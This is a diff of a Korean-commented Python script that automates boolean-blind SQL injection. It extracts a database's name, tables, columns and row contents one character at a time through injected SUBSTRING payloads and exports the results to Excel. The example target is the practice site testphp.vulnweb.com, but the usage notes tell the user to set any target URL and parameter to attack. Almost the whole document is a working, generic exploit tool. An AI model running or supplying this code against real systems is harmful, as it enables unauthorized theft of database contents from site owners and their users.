@@ -1,125 +1,179 @@
 import requests
-import pandas as pd  # pandas 라이브러리 추가
-from openpyxl import Workbook  # 엑셀 저장을 위한 openpyxl
+import pandas as pd
+from colorama import Fore, Style, init
+from openpyxl import Workbook
 
-# 대상 URL 설정
-url = "http://testphp.vulnweb.com/artists.php?"  # 테스트할 대상 URL
-param_name = "artist"  # 공격할 파라미터 이름 (예: id)
+# Colorama 초기화
+init(autoreset=True)
 
-# 참/거짓 판별을 위한 응답의 키워드
-true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 내용 (사용자 환경에 맞게 수정)
+# 설정 정보
+url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
+param_name = "artist"  # 공격할 파라미터 이름
+true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
 
 # 참/거짓 판별 함수
 def is_true_response(response):
     return true_response_indicator in response.text
 
-# 테이블의 컬럼 이름 추출 함수
-def find_column_names(table_name):
-    column_names = []
-    for index in range(0, 100):  # 최대 100개의 컬럼을 가정
+# 데이터베이스 이름 추출 함수
+def get_database_name():
+    db_name = ""
+    print(Fore.CYAN + "[정보] 데이터베이스 이름을 찾고 있습니다...")
+    for i in range(1, 50):  # 최대 길이 50자 가정
+        found_char = False
+        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+            payload = f"1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --"
+            params = {param_name: payload}
+            response = requests.get(url, params=params)
+
+            if is_true_response(response):
+                db_name += char
+                print(Fore.YELLOW + f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                found_char = True
+                break
+        if not found_char:
+            break
+    print(Fore.GREEN + f"[완료] 데이터베이스 이름: {db_name}")
+    return db_name
+
+# 테이블 이름 추출 함수
+def get_table_names(limit=0):
+    tables = []
+    print(Fore.CYAN + "[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
+    for index in range(0, limit or 100):  # 사용자가 지정한 개수만큼 또는 최대 100개 테이블
+        table_name = ""
+        for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = f"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --"
+                params = {param_name: payload}
+                response = requests.get(url, params=params)
+
+                if is_true_response(response):
+                    table_name += char
+                    found_char = True
+                    print(Fore.YELLOW + f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                    break
+            if not found_char:
+                break
+        if table_name:
+            tables.append(table_name)
+            print(Fore.GREEN + f"[테이블 발견] {index + 1}번째 테이블 이름: {table_name}")
+        else:
+            break
+    
+    print(Fore.CYAN + f"[완료] 총 {len(tables)}개의 테이블 이름 추출:\n" + "\n".join(tables))
+    return tables
+
+# 컬럼 이름 추출 함수
+def get_column_names(table_name, limit=0):
+    columns = []
+    print(Fore.CYAN + f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
+    for index in range(0, limit or 100):  # 사용자가 지정한 개수만큼 또는 최대 100개 컬럼
         column_name = ""
-        for i in range(1, 50):  # 컬럼 이름의 최대 길이를 50자로 가정
-            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
-                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1),{i},1)))={char_code}-- -"
+        for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = f"1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --"
                 params = {param_name: payload}
                 response = requests.get(url, params=params)
 
                 if is_true_response(response):
-                    column_name += chr(char_code)
-                    print(f"[+] Found character: {chr(char_code)} at position {i} for column {index + 1}")
+                    column_name += char
+                    found_char = True
+                    print(Fore.YELLOW + f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                     break
-
-            if char_code == 126 and len(column_name) == i - 1:
+            if not found_char:
                 break
-
         if column_name:
-            print(f"[+] Column {index + 1} name: {column_name}")
-            column_names.append(column_name)
+            columns.append(column_name)
+            print(Fore.GREEN + f"[컬럼 발견] {index + 1}번째 컬럼 이름: {column_name}")
         else:
             break
-    return column_names
+    
+    print(Fore.CYAN + f"[완료] 총 {len(columns)}개의 컬럼 이름 추출:\n" + "\n".join(columns))
+    return columns
 
-# 특정 컬럼에서 데이터 추출 함수
-def find_column_data(table_name, column_name):
-    column_data = []
-    for index in range(0, 100):  # 최대 100개의 데이터 행을 가정
+# 특정 테이블 컬럼의 데이터 추출 함수
+def get_column_data(table_name, column_name, limit=0):
+    data = []
+    print(Fore.CYAN + f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")
+    for index in range(0, limit or 100):  # 사용자가 지정한 개수만큼 또는 최대 100개 데이터 행
         row_data = ""
-        for i in range(1, 50):  # 데이터의 최대 길이를 50자로 가정
-            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
-                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{i},1)))={char_code}-- -"
+        for i in range(1, 50):  # 데이터 길이 최대 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = f"1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
                 params = {param_name: payload}
                 response = requests.get(url, params=params)
 
                 if is_true_response(response):
-                    row_data += chr(char_code)
-                    print(f"[+] Found character: {chr(char_code)} at position {i} for row {index + 1}")
+                    row_data += char
+                    found_char = True
+                    print(Fore.YELLOW + f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                     break
-
-            if char_code == 126 and len(row_data) == i - 1:
+            if not found_char:
                 break
-
         if row_data:
-            print(f"[+] Row {index + 1} data: {row_data}")
-            column_data.append(row_data)
+            data.append(row_data)
+            print(Fore.GREEN + f"[데이터 발견] {index + 1}번째 행 데이터: {row_data}")
         else:
             break
-    return column_data
+    
+    print(Fore.CYAN + f"[완료] 총 {len(data)}개의 데이터 추출:\n" + "\n".join(data))
+    return data
 
-# 엑셀 파일로 데이터를 저장하는 함수
-def save_to_excel(data, column_name, table_name):
-    # pandas DataFrame으로 변환
-    df = pd.DataFrame(data, columns=[column_name])
+# 엑셀 파일 저장 함수
+def save_to_excel(data, filename):
+    df = pd.DataFrame(data)
+    df.to_excel(filename, index=False)
+    print(Fore.GREEN + f"[완료] 데이터가 '{filename}' 파일로 저장되었습니다.")
 
-    # 엑셀 파일로 저장 (파일 이름은 테이블과 컬럼 이름을 사용)
-    file_name = f"{table_name}_{column_name}_data.xlsx"
-    df.to_excel(file_name, index=False)
-    print(f"[+] Data has been saved to {file_name}")
-
-# 메인 실행 함수
-if __name__ == "__main__":
-    # 1. 테이블 이름 입력
-    table_name = input("Enter the table name: ")
-
-    # 2. 해당 테이블의 컬럼 이름 추출
-    print(f"[INFO] Extracting column names for table: {table_name}")
-    column_names = find_column_names(table_name)
-
-    if column_names:
-        print(f"[+] Found column names: {column_names}")
-
-        # 3. 사용자가 추출할 컬럼을 선택
-        column_name = input(f"Enter the column name from {column_names}: ")
-
-        if column_name in column_names:
-            # 4. 해당 컬럼의 데이터 추출
-            print(f"[INFO] Extracting data for column: {column_name}")
-            column_data = find_column_data(table_name, column_name)
-
-            # 5. 데이터를 엑셀로 저장
-            save_to_excel(column_data, column_name, table_name)
-        else:
-            print("[-] Invalid column name.")
+# 저장 여부 확인 함수
+def ask_to_save(data, filename):
+    save_choice = input(Fore.MAGENTA + "데이터를 엑셀 파일로 저장하시겠습니까? (Y/N): ").strip().upper()
+    if save_choice == "Y":
+        save_to_excel(data, filename)
     else:
-        print("[-] Could not find any column names.")
+        print(Fore.RED + "데이터 저장이 취소되었습니다.")
 
+# 명령 선택 실행 함수
+def main():
+    while True:
+        print(Fore.CYAN + "\n[옵션 선택]")
+        print("1. 데이터베이스 추출")
+        print("2. 테이블 추출")
+        print("3. 컬럼 추출")
+        print("4. 데이터 추출")
+        print("5. 종료")
+        choice = input(Fore.MAGENTA + "원하는 작업을 선택하세요: ")
 
-추가된 부분 설명:
-1. pandas와 openpyxl 사용:
-pandas는 데이터 처리 및 엑셀 파일로 변환하는 데 사용됩니다.
-openpyxl은 엑셀 파일을 다루기 위해 사용됩니다. pandas는 엑셀 파일을 생성하기 위해 openpyxl이 필요합니다.
+        if choice == "1":
+            db_name = get_database_name()
+        elif choice == "2":
+            limit = int(input(Fore.MAGENTA + "추출할 테이블 개수를 입력하세요 (0 입력 시 전체 추출): "))
+            tables = get_table_names(limit)
+            ask_to_save({"Table Names": tables}, "tables.xlsx")
+        elif choice == "3":
+            table_name = input(Fore.MAGENTA + "컬럼을 가져올 테이블 이름을 입력하세요: ")
+            limit = int(input(Fore.MAGENTA + "추출할 컬럼 개수를 입력하세요 (0 입력 시 전체 추출): "))
+            columns = get_column_names(table_name, limit)
+            ask_to_save({"Column Names": columns}, f"{table_name}_columns.xlsx")
+        elif choice == "4":
+            table_name = input(Fore.MAGENTA + "데이터를 가져올 테이블 이름을 입력하세요: ")
+            column_name = input(Fore.MAGENTA + "데이터를 가져올 컬럼 이름을 입력하세요: ")
+            limit = int(input(Fore.MAGENTA + "추출할 데이터 개수를 입력하세요 (0 입력 시 전체 추출): "))
+            data = get_column_data(table_name, column_name, limit)
+            ask_to_save({column_name: data}, f"{table_name}_{column_name}_data.xlsx")
+        elif choice == "5":
+            print(Fore.RED + "프로그램을 종료합니다.")
+            break
+        else:
+            print(Fore.RED + "잘못된 선택입니다. 다시 입력하세요.")
 
-
-
-2. 엑셀로 데이터 저장 (save_to_excel()):
-pandas의 DataFrame을 사용하여 추출된 데이터를 구조화한 후, 엑셀 파일로 저장합니다.
-파일 이름은 테이블 이름과 컬럼 이름을 기반으로 자동으로 지정됩니다.
-
-
-
-3. 데이터프레임 생성:
-추출한 컬럼 데이터를 pandas의 DataFrame으로 변환하여 엑셀로 저장합니다. 이를 통해 쉽게 구조화된 데이터를 엑셀로 내보낼 수 있습니다.
-
-
+# 프로그램 실행
+if __name__ == "__main__":
+    main()
 
 
 설치해야 할 라이브러리:
@@ -127,7 +181,7 @@ pandas의 DataFrame을 사용하여 추출된 데이터를 구조화한 후, 엑
 pip install pandas openpyxl
 
 사용 방법:
-1. 테이블 이름 입력: 사용자가 추출하고자 하는 테이블 이름을 입력합니다.
-2. 컬럼 이름 추출: 테이블에서 추출한 컬럼 이름을 선택합니다.
-3. 컬럼 데이터 추출: 선택된 컬럼에서 데이터를 추출하고 엑셀 파일로 저장합니다.
-저장된 파일은 테이블_컬럼_이름.xlsx 형식으로 저장됩니다.
+1. url = # 대상 url 지정
+2. param_name = # 공격할 파라미터 이름 지정
+3.공격할 구문 지정
+
